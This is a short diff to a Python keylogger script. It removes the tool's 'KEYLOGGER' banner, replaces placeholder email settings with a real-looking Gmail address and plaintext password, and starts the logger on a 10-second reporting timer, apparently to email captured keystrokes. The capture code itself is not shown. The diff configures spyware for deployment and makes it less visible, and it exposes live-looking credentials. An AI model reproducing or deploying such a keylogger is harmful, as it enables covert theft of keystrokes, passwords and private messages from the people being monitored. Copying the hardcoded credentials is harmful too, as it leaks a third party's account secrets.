@@ -137,19 +137,10 @@ class KeyLogger:
         if self.timer:
             self.timer.cancel()
 
-# ASCII Art for Keylogger Header
-ascii_art = """
-▒█░▄▀ ▒█▀▀▀ ▒█░░▒█ ▒█░░░ ▒█▀▀▀█ ▒█▀▀█ ▒█▀▀█ ▒█▀▀▀ ▒█▀▀█ 
-▒█▀▄░ ▒█▀▀▀ ▒█▄▄▄█ ▒█░░░ ▒█░░▒█ ▒█░▄▄ ▒█░▄▄ ▒█▀▀▀ ▒█▄▄▀ 
-▒█░▒█ ▒█▄▄▄ ░░▒█░░ ▒█▄▄█ ▒█▄▄▄█ ▒█▄▄█ ▒█▄▄█ ▒█▄▄▄ ▒█░▒█
-"""
-
-# Print ASCII art
-print(ascii_art)
 
 # Configure email and password
-EMAIL_ADDRESS = "your-email"
-EMAIL_PASSWORD = "your-pass"
+EMAIL_ADDRESS = "xdlolol963@gmail.com"
+EMAIL_PASSWORD = "chintu2001"
 
 # Initialize and start keylogger
 keylogger = KeyLogger(10, EMAIL_ADDRESS, EMAIL_PASSWORD)
